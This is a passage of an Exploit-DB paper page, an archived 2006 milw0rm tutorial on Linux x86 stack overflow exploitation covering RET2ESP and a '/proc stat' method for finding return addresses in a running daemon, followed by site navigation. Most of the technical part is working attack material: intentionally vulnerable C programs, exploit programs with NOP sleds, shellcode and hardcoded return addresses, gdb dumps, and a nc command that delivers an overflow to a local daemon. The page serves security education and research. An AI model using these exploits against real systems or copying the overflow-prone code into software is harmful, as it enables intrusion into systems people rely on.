				&quot;\x40&quot;				// incl %eax
				&quot;\xcd\x80&quot;			// int $0x80
								//

	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; 
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; 
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
			        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;

								//
				&quot;\xc3\x84\x04\x08&quot;;		// RET ADDRESS / 0x080484c3 &lt;__do_global_ctors_aux+35&gt;:  call   *%eax
								//

			int main(int argc, char **argv, char **envp) {
				char *args[] = { &quot;vuln&quot; , evilbuf , NULL };
				return execve(&quot;vuln&quot;, args, envp);
			}

		--- snip snip ---
				
	RET2ESP
	-------

		This method relies on unique hex, representative of hardcoded values... or in other words, doubles meaning.

		Going back to basics: the basic data unit in computers is bits, and every 8 bits are converted to a byte.
		In the process, the actual bits never change, but rather the logical meaning.  For instance, the difference between
		a signed and unsigned is up to the program to recognize the MSB as sign bit nor data bit.  As there is no 
		absolute way to define a group of bits, different interpretation becomes possible.

		The number 58623 might not be special at first glance, but the hex value of 58623 is. The representative hex
		number is FFE4, and FFE4 is translated to &#039;JMP %ESP&#039; and that&#039;s special.  As hardcoded values are
		part of the program actual code, this freaky idea becomes an actual solution.

		--- snip snip ---

			/*
			 * vuln.c, Unique strcpy() buffer overflow
			 */

			#include &lt;stdio.h&gt;
			#include &lt;stdlib.h&gt;
			
			int main(int argc, char **argv) {
				int j = 58623;
				char buf[256];
				strcpy(buf, argv[1]);
				return 1;
			}

		--- snip snip ---

		Starting with disassembling it

			(gdb) disassemble main
			Dump of assembler code for function main:
			0x08048384 &lt;main+0&gt;:    push   %ebp
			0x08048385 &lt;main+1&gt;:    mov    %esp,%ebp
			0x08048387 &lt;main+3&gt;:    sub    $0x118,%esp
			0x0804838d &lt;main+9&gt;:    and    $0xfffffff0,%esp
			0x08048390 &lt;main+12&gt;:   mov    $0x0,%eax
			0x08048395 &lt;main+17&gt;:   sub    %eax,%esp
			0x08048397 &lt;main+19&gt;:   movl   $0xe4ff,0xfffffff4(%ebp)
			0x0804839e &lt;main+26&gt;:   sub    $0x8,%esp
			0x080483a1 &lt;main+29&gt;:   mov    0xc(%ebp),%eax
			0x080483a4 &lt;main+32&gt;:   add    $0x4,%eax
			0x080483a7 &lt;main+35&gt;:   pushl  (%eax)
			0x080483a9 &lt;main+37&gt;:   lea    0xfffffee8(%ebp),%eax
			0x080483af &lt;main+43&gt;:   push   %eax
			0x080483b0 &lt;main+44&gt;:   call   0x80482b0 &lt;_init+56&gt;
			0x080483b5 &lt;main+49&gt;:   add    $0x10,%esp
			0x080483b8 &lt;main+52&gt;:   leave
			0x080483b9 &lt;main+53&gt;:   ret
			0x080483ba &lt;main+54&gt;:   nop
			0x080483bb &lt;main+55&gt;:   nop
			0x080483bc &lt;main+56&gt;:   nop
			0x080483bd &lt;main+57&gt;:   nop
			0x080483be &lt;main+58&gt;:   nop
			0x080483bf &lt;main+59&gt;:   nop
			End of assembler dump.
		
		Tearing down [ &lt;main+19&gt; ] to bytes

			(gdb) x/7b 0x08048397
			0x8048397 &lt;main+19&gt;:    0xc7    0x45    0xf4    0xff    0xe4    0x00    0x00
			(gdb)

		Perform an offset (+3 bytes) jump to the middle of the instruction, interpreted as

			(gdb) x/1i 0x804839a
			0x804839a &lt;main+22&gt;:    jmp    *%esp
			(gdb)
		
		Beauty is in the eye of the beholder, and in this case the x86 CPU ;-)

		--- snip snip ---

			/*
			 * exploit.c, Exploits vuln.c (RET2ESP)
			 */

			#include &lt;stdio.h&gt;
			#include &lt;unistd.h&gt;

			char evilbuf[] =

	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; 
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; 
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; 
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; 
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot; 
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;
	                        &quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;

								//
				&quot;\x9a\x83\x04\x08&quot;		// RET ADDRESS / 0x804839a &lt;main+22&gt;:    jmp    *%esp
								//

								// 
				&quot;\x31\xc0&quot;			// xorl %eax, %eax
				&quot;\x31\xdb&quot;			// xorl %ebx, %ebx
				&quot;\x40&quot;				// incl %eax
				&quot;\xcd\x80&quot;;			// int $0x80
								//

			int main(int argc, char **argv, char **envp) {
				char *args[] = { &quot;vuln&quot; , evilbuf , NULL };
				return execve(&quot;vuln&quot;, args, envp);
			}

		--- snip snip ---

		Here&#039;s a tiny table of 16 bit values that includes &#039;FFE4&#039; in it:

			 -----------------------
			 |  VAL  |  HEX  | S/U |  
			 +---------------+-----+
			 | 58623 | e4ff  |  S  |
			 | -6913 | e4ff  |  U  |
			 -----------------------

Stack Stethoscope 
-----------------

	This method is designed to locally attack an already running process (e.g. daemons), its advantage comes from 
	accessing the attacked process /proc entry, and using it for calculating the exact return address inside that stack.

	The benefit of exploiting daemon locally is that the exploit can, prior to attacking, browse that process /proc entry.
	Every process has a /proc entry which associated to the process pid (e.g. /proc/&lt;pid&gt;) and by default open to everybody. 
	In practical, a file inside the proc entry called &#039;stat&#039; include very significant data for the exploit, and that&#039;s the
	process stack start address.

		root@magicbox:~# cat /proc/1/stat | awk &#039;{ print $28 }&#039;
		3213067536
		root@magicbox:~#

	Taking this figure [ 3213067536 ] and converting to hex [ 0xbf838510 ] gives the process stack start address.
	This is significant to the exploit, as knowing this detail allows an alternative way to navigate inside the stack and predict 
	the return address to the shellcode.

	Normally, exploits use absolute return addresses which are a result of testing on different binaries/distributions.
	Alternatively, calculating the distance of stack start address from the ESP register value after exploiting is equal
	to having the return address itself.

        --- snip snip ---
				
		/*
                 * dumbo.c, Exploitable Daemon
                 */
		
	        #include &lt;sys/types.h&gt;
	        #include &lt;stdio.h&gt;
	        #include &lt;stdlib.h&gt;
	        #include &lt;unistd.h&gt;
	        #include &lt;sys/socket.h&gt;
	        #include &lt;netinet/in.h&gt;

	        int main(int argc, char **argv) {
	        	int sock, addrlen, nsock;
	                struct sockaddr_in sin;
        	        char buf[256];

	                sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

        	        if (sock &lt; 0) {
      	        		perror(&quot;socket&quot;);
	                        return -1;
        	        }

	                sin.sin_family = AF_INET;
	                sin.sin_addr.s_addr = htonl(INADDR_ANY);
	                sin.sin_port = htons(31338);
	                addrlen = sizeof(sin);

	                if (bind(sock, (struct sockaddr *) &amp;sin, addrlen) &lt; 0) {
	 	     		perror(&quot;bind&quot;);
                	        return -1;
	                }

        	        if (listen(sock, 5) &lt; 0) {
                	  	perror(&quot;listen&quot;);
	                        return -1;
	                }

        	        nsock = accept(sock, (struct sockaddr *) &amp;sin, &amp;addrlen);

	                if (nsock &lt; 0) {
		              	perror(&quot;accept&quot;);
	                        close(sock);
	                        return -1;
	                }

	                read(nsock, buf, 1024);

			close(nsock);
	                close(sock);

	                return 1;
		}
	
	--- snip snip ---

	Starting by running the daemon

		root@magicbox:/tmp# ./dumbo &amp;
		[1] 19296
		root@magicbox:/tmp#
		
	Now retrieving the process stack start address

		root@magicbox:/tmp# cat /proc/19296/stat | awk &#039;{ print $28 }&#039;
		3221223520
		root@magicbox:/tmp#
	
	Attaching to it, and putting a breakpoint prior to read() invocation

		(gdb) x/1i 0x08048677
		0x8048677 &lt;main+323&gt;:   call   0x8048454 &lt;_init+184&gt;
		(gdb) break *main+323
		Breakpoint 1 at 0x8048677
		(gdb) continue
		
	Shooting it down

		root@magicbox:/tmp# perl -e &#039;print &quot;A&quot; x 320&#039; | nc localhost 31338

	Going back to the debugger, to check on &#039;buf&#039; pointer

		Breakpoint 1, 0x08048677 in main ()
		(gdb) x/a $esp+4
		0xbffff694:     0xbffff6b0
		(gdb)
	
	Now it comes down to a simple math

		0xbffff860 -
		0xbffff6b0
		----------
		432 bytes
	
	So by subtracting the stack start address from the buf pointer, we got the ratio between the two. 
	Now, using this data, an exploit can generate a perfect return address.

	--- snip snip ---

		/*			
	         * dumbo-exp.c, Exploits &#039;dumbo.c&#039;
	  	 */

	        #include &lt;sys/types.h&gt;
        	#include &lt;stdio.h&gt;
	        #include &lt;unistd.h&gt;
	        #include &lt;stdlib.h&gt;
	        #include &lt;string.h&gt;
	        #include &lt;fcntl.h&gt;
	        #include &lt;netinet/in.h&gt;
	        #include &lt;sys/socket.h&gt;
	        #include &lt;arpa/inet.h&gt;
	
	        char *shellcode =
	 		&quot;\x31\xc0&quot;  	// xorl %eax, %eax
                        &quot;\x31\xdb&quot;  	// xorl %ebx, %ebx
                        &quot;\x40&quot;      	// incl %eax
                        &quot;\xcd\x80&quot;;	// int $0x80
		
            	unsigned long proc_getstackaddr(int pid) {
            		int fd, jmps;
	                char fname[24], buf[512], *data;
	                unsigned long addr;
		
        	        snprintf(fname, sizeof(fname), &quot;/proc/%d/stat&quot;, pid);

	                fd = open(fname, O_RDONLY);
	
        	        if ( (fd &lt; 0) || (read(fd, buf, sizeof(buf)) &lt; 0) ) {
	               		perror(fname);
	                        return 0;
        	        }

	                data = strtok(buf, &quot; &quot;);

        	        for (jmps = 0; ( (jmps &lt; 27) &amp;&amp; data ) ; jmps++) {
                		data = strtok(NULL, &quot; &quot;);
	                }

        	        if (!data) {
                		fprintf(stderr, &quot;(%s) is shorter then expected, (corrupted?)\n&quot;, fname);
	                        return 0;
        	        }

	                addr = strtoul(data, NULL, 0);

	                if (addr &lt; 0) {
        	          	fprintf(stderr, &quot;(%s) invalid stack start address, %s is corrupted (?)\n&quot;, data, fname);
                	        return 0;
                  	}

	                return addr;
		}

	        int main(int argc, char **argv) {
	       		int sock;
                	struct sockaddr_in sin;

	                struct badpkt {
        	          	char shcode[7];
	                        char padbuf[290];
	                        unsigned long retaddr;
	                } badpkt;

	                if (argc &lt; 2) {
        		       	printf(&quot;usage: %s &lt;given-pid&gt;\n&quot;, argv[0]);
	                        return 0;
	                }

	                if (!(badpkt.retaddr = proc_getstackaddr(atoi(argv[1]))))
        	 	      	return 0;
                        
	                badpkt.retaddr -= 432;

	                strcpy(badpkt.shcode, shellcode);
	                memset(badpkt.padbuf, 0x41, sizeof(badpkt.padbuf));

	                sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);

        	        if (sock &lt; 0) {
                	  	perror(&quot;socket&quot;);
                        	return 0;
	                }

          	        sin.sin_family = AF_INET;
	                sin.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;);
	                sin.sin_port = htons(31338);

	                if (connect(sock, (struct sockaddr *) &amp;sin, sizeof(sin)) &lt; 0) {
			        perror(&quot;connect&quot;);
	                        return 0;
        	        }

	                printf(&quot;*** Dumbo is going down! (RET: 0x%08x) ***\n&quot;, badpkt.retaddr);
	                write(sock, (void *) &amp;badpkt, sizeof(badpkt));

	                close(sock);

        	        return 1;
		}

	--- snip snip ---
	
Contact
-------

	Izik &lt;izik@tty64.org&gt; [or] http://www.tty64.org

# milw0rm.com [2006-03-10]
            </code></pre>

                    </div>

                    <div class="card-footer">

                        <div class="row">

                            <div class="col">

                                <strong>Tags:</strong>

                                
                            </div>

                            <div class="col">

                                
                                
                            </div>

                            <div class="col">

                                <span class="float-right">

                                    <strong>Advisory/Source:</strong>

                                    <a href="" target="_blank">
                                        Link
                                    </a>

                                </span>

                            </div>

                        </div>

                        <div class="row mt-3">

                            <div class="btn-group ml-2">

                                <a class="btn btn-primary btn-fab btn-icon btn-round"
                                   href="/papers/13231" aria-label="View Previous Paper"
                                   data-toggle="tooltip" data-placement="top" title="Previous Paper" >
                                    <i class="mdi mdi-arrow-left mdi-36px"></i>
                                </a>

                            </div>

                            <div class="col">

                                <div class="btn-group float-right">

                                    <a class="btn btn-primary btn-fab btn-icon btn-round"
                                       href="/papers/13233" aria-label="View Next Paper"
                                       data-toggle="tooltip" data-placement="top" title="Next Paper" >
                                        <i class="mdi mdi-arrow-right mdi-36px"></i>
                                    </a>

                                </div>

                            </div>

                        </div>

                    </div>

                </div>

                <div class="card">

                    <div class="card-footer">

    <div class="d-none d-lg-block">

        <div class="container-fluid">

            <table class="table table-borderless text-center">

                <thead style="background-color:#083257;">

                <tr class="text-white">
                        <th>
                            <strong>Downloads</strong>
                        </th>
                        <th>
                            <strong>Certifications</strong>
                        </th>
                        <th>
                            <strong>Training</strong>
                        </th>
                        <th>
                            <strong>Professional Services</strong>
                        </th>
                    </tr>

                </thead>

                <tbody>

                <tr class="text-center">
                    <td>
                        <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                            Kali Linux
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">OSCP
                        </a>
                    </td>
                    <td>
                        <a href="/pentest-training-with-kali-linux"
                           target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/"
                           target="_blank" rel="noopener">Penetration Testing
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td>
                        <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                           target="_blank" rel="noopener">
                            Kali NetHunter
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">OSWP
                        </a>
                    </td>
                    <td>
                        <a href="/wireless-attacks-training"
                           target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#other-services"
                           target="_blank" rel="noopener">Advanced Attack Simulation
                        </a>
                    </td>
                </tr>
                <tr>
                    <td>
                        <a href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                           target="_blank" rel="noopener">Kali Linux Revealed Book
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">OSEP
                        </a>
                    </td>
                    <td>
                        <a href="/evasion-techniques-breaching-defenses"
                           target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                           <br />All new for 2020
                        </a>
                    </td>
                    <td>
                        <a href="https://www.offensive-security.com/penetration-testing/#asa"
                           target="_blank" rel="noopener">Application Security Assessment
                        </a>
                    </td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">OSWE
                        </a>
                    </td>
                    <td>
                        <a href="/advanced-web-attacks"
                           target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                           <br />Updated for 2020
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">OSED
                        </a>
                    </td>
                    <td>
                        <a href="/windows-user-mode-exploit-development"
                           target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                           <br />All new for 2021
                        </a>
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://www.offensive-security.com/awe-osee/"
                           target="_blank" rel="noopener">OSEE
                        </a>
                    </td>
                    <td>
<!--
                        <a href="https://www.offensive-security.com/metasploit-unleashed/"
                           target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                        </a>
-->
                    </td>
                    <td></td>
                </tr>

                <tr class="text-center">
                    <td></td>
                    <td>
                        <a href="https://kali.training/"
                           target="_blank" rel="noopener">KLCP
                        </a>
                    </td>
                    <td>
                        <a href="https://kali.training/courses/kali-linux-revealed/"
                           target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                        </a>
                    </td>
                    <td></td>
                </tr>

                </tbody>

            </table>

        </div>

    </div>

    <div class="d-lg-none text-center">

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownDownloads" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Downloads
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownDownloads">

                <a class="dropdown-item" href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                    Kali Linux
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                   target="_blank" rel="noopener">
                    Kali NetHunter
                </a>
                <a class="dropdown-item"
                   href="https://kali.training/downloads/Kali-Linux-Revealed-1st-edition.pdf"
                   target="_blank" rel="noopener">
                    Kali Linux Revealed Book
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownCerts" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Certifications
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownCerts">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener">OSCP
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">OSWP
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">OSEP
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">OSWE
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">OSED
                </a>
                <a class="dropdown-item"
                   href="https://www.offensive-security.com/awe-osee/"
                   target="_blank" rel="noopener">OSEE
                </a>
                <a class="dropdown-item" href="https://kali.training/"
                   target="_blank" rel="noopener">KLCP
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownTraining" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Training
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownTraining">

                <a class="dropdown-item"
                   href="/pentest-training-with-kali-linux"
                   target="_blank" rel="noopener"> - Penetration Testing with Kali Linux (PWK) (PEN-200)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/wireless-attacks-training"
                   target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                </a>
                <a class="dropdown-item"
                   href="/evasion-techniques-breaching-defenses"
                   target="_blank" rel="noopener">Evasion Techniques and Breaching Defences (PEN-300)
                   <br />All new for 2020
                </a>
                <a class="dropdown-item"
                   href="/advanced-web-attacks"
                   target="_blank" rel="noopener">Advanced Web Attacks and Exploitation (AWAE) (WEB-300)
                   <br />Updated for 2020
                </a>
                <a class="dropdown-item"
                   href="/windows-user-mode-exploit-development"
                   target="_blank" rel="noopener">Windows User Mode Exploit Development (EXP-301)
                   <br />All new for 2021
                </a>
<!--
                <a class="dropdown-item" href="https://www.offensive-security.com/metasploit-unleashed/"
                   target="_blank" rel="noopener">[Free] Metasploit Unleashed (MSFU)
                </a>
-->
                <a class="dropdown-item" href="https://kali.training/courses/kali-linux-revealed/" target="_blank"
                   target="_blank" rel="noopener" title="Your journey starts here!">[Free] Kali Linux Revealed
                </a>

            </div>

        </div>

        <div class="btn-group btn-block mt-1">

            <a class="btn btn-block btn-primary dropdown-toggle" href="#" role="button" id="dropdownServices" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                Pro Services
            </a>

            <div class="dropdown-menu" aria-labelledby="dropdownServices">

                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/"
                   target="_blank" rel="noopener">Penetration Testing
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#other-services"
                   target="_blank" rel="noopener">Advanced Attack Simulation
                </a>
                <a class="dropdown-item" href="https://www.offensive-security.com/penetration-testing/#asa"
                   target="_blank" rel="noopener">Application Security Assessment
                </a>

            </div>

        </div>

    </div>

</div>

                </div>

            </div>

        </div>

    </div>


        
        <footer class="footer">

    <div class="container-fluid">

        <nav>

            <ul>

                <li>
                    <a href="https://twitter.com/exploitdb" target="_blank" aria-label="Exploit-DB Twitter" rel="noopener">

    <i class="mdi mdi-twitter mdi-36px"></i>

</a>


<a href="https://www.facebook.com/ExploitDB" target="_blank" aria-label="Exploit-DB Facebook" rel="noopener">

    <i class="mdi mdi-facebook mdi-36px"></i>
</a>

<a href="https://github.com/offensive-security/exploitdb" target="_blank" aria-label="Exploit-DB GitHub" rel="noopener">

    <i class="mdi mdi-github-circle mdi-36px"></i>
</a>                </li>

                <li>

                    <a href="/">
                        Exploit Database by Offensive Security
                    </a>

                </li>

                <li>

                    <a href="/terms">
                        Terms
                    </a>

                </li>

                <li>

                    <a href="/privacy">
                        Privacy
                    </a>

                </li>

                <li>

                    <a href="#" data-toggle="modal" data-target="#about">
                        About Us
                    </a>

                </li>

                <li>

                    <a href="/faq">
                        FAQ
                    </a>

                </li>

                <li>

                    <a href="/cookies">
                        Cookies
                    </a>

                </li>

            </ul>

        </nav>

        <div class="copyright mt-4">

            &copy;
            <a href="https://www.offensive-security.com/" target="_blank">OffSec Services Limited</a> 2021. All rights reserved.

        </div>

    </div>

    <!-- About EDB/GHDB Modal -->
<div class="modal fade bd-example-modal-lg" id="about" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title"
                    id="aboutModalTitle">About The Exploit Database
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <div class="row">

                    <p>
                        <a href="https://www.offensive-security.com/" target="_blank" rel="noopener">
                            <img class="float-left" src="/images/offsec-logo-gray-trans-300x171.png"
                                 alt="Offensive Security">
                        </a>
                        The Exploit Database is maintained by <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a>, an information security training company
                        that provides various <a
                                href="https://www.offensive-security.com/courses-and-certifications/"
                                target="_blank" rel="noopener">Information Security Certifications</a> as well as high end <a
                                href="https://www.offensive-security.com/penetration-testing/"
                                target="_blank" rel="noopener">penetration testing</a> services. The Exploit Database is a
                        non-profit project that is provided as a public service by Offensive Security.
                    </p>

                    <p>The Exploit Database is a <a
                                href="http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html" target="_blank" rel="noopener">CVE
                            compliant</a> archive of public exploits and corresponding vulnerable software,
                        developed for use by penetration testers and vulnerability researchers. Our aim is to serve
                        the most comprehensive collection of exploits gathered through direct submissions, mailing
                        lists, as well as other public sources, and present them in a freely-available and
                        easy-to-navigate database. The Exploit Database is a repository for exploits and
                        proof-of-concepts rather than advisories, making it a valuable resource for those who need
                        actionable data right away.
                    </p>

                    <p>The <a href="/google-hacking-database">Google Hacking Database (GHDB)</a>
                        is a categorized index of Internet search engine queries designed to uncover interesting,
                        and usually sensitive, information made publicly available on the Internet. In most cases,
                        this information was never meant to be made public but due to any number of factors this
                        information was linked in a web document that was crawled by a search engine that
                        subsequently followed that link and indexed the sensitive information.
                    </p>

                    <p>The process known as Google Hacking was popularized in 2000 by Johnny
                        Long, a professional hacker, who began cataloging these queries in a database known as the
                        Google Hacking Database. His initial efforts were amplified by countless hours of community
                        member effort, documented in the book Google Hacking For Penetration Testers and popularised
                        by a barrage of media attention and Johnnys talks on the subject such as this early talk
                        recorded at <a href="https://www.defcon.org/html/links/dc-archives/dc-13-archive.html"
                                       target="_blank" rel="noopener">DEFCON 13</a>. Johnny coined the term Googledork to refer
                        to a foolish or inept person as revealed by Google. This was meant to draw attention to
                        the fact that this was not a Google problem but rather the result of an often
                        unintentional misconfiguration on the part of a user or a program installed by the user.
                        Over time, the term dork became shorthand for a search query that located sensitive
                        information and dorks were included with may web application vulnerability releases to
                        show examples of vulnerable web sites.
                    </p>

                    <p>After nearly a decade of hard work by the community, Johnny turned the GHDB
                        over to <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a> in November 2010, and it is now maintained as
                        an extension of the <a href="/">Exploit Database</a>. Today, the GHDB includes searches for
                        other online search engines such as <a href="https://www.bing.com/" target="_blank" rel="noopener">Bing</a>,
                        and other online repositories like <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>,
                        producing different, yet equally valuable results.
                    </p>


                </div>

            </div>

            <div class="modal-footer">

                <button type="button"
                        class="btn btn-primary"
                        data-dismiss="modal">Close
                </button>

            </div>

        </div>

    </div>

</div>


    <div class="modal fade bd-example-modal-lg" id="osresources" tabindex="-1"
     role="dialog" aria-labelledby="searchModalTitle" aria-hidden="true">

    <div class="modal-dialog modal-dialog-centered modal-dialog modal-lg"
         role="document">

        <div class="modal-content">

            <div class="modal-header">

                <h5 class="modal-title text-primary"
                    id="resourcesModalTitle">Offensive Security Resources
                </h5>

                <button type="button" class="close" data-dismiss="modal"
                        aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>

            </div>

            <div class="modal-body">

                <table class="table dataTable table-borderless">

                            <thead>

                            <tr>
                                <th class="text-center"><strong>Downloads</strong></th>
                                <th class="text-center"><strong>Certifications</strong></th>
                                <th class="text-center"><strong>Training</strong></th>
                                <th class="text-center"><strong>Services</strong></th>
                            </tr>

                            </thead>

                            <tbody>

                            <tr class="text-center">

                                <td>
                                    <a href="https://www.kali.org/downloads/" target="_blank" rel="noopener">
                                        Kali Linux
                                    </a>
                                </td>
                                <td>
                                    <a href="/pentest-training-with-kali-linux"
                                       target="_blank" rel="noopener">OSCP
                                    </a>
                                </td>
                                <td>
                                    <a href="/pentest-training-with-kali-linux"
                                       target="_blank" rel="noopener">Penetration Testing with Kali Linux (PWK) (PEN-200)
                                       <br />All new for 2020
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/"
                                       target="_blank" rel="noopener">Penetration Testing
                                    </a>
                                </td>

                            </tr>

                            <tr class="text-center">

                                <td>
                                    <a href="https://www.offensive-security.com/kali-linux-nethunter-download/"
                                       target="_blank" rel="noopener">
                                        Kali NetHunter
                                    </a>
                                </td>
                                <td>
                                    <a href="/wireless-attacks-training"
                                       target="_blank" rel="noopener">OSWP
                                    </a>
                                </td>
                                <td>
                                    <a href="/wireless-attacks-training"
                                       target="_blank" rel="noopener">Offensive Security Wireless Attacks (WiFu) (PEN-210)
                                    </a>
                                </td>
                                <td>
                                    <a href="https://www.offensive-security.com/penetration-testing/#other-services"
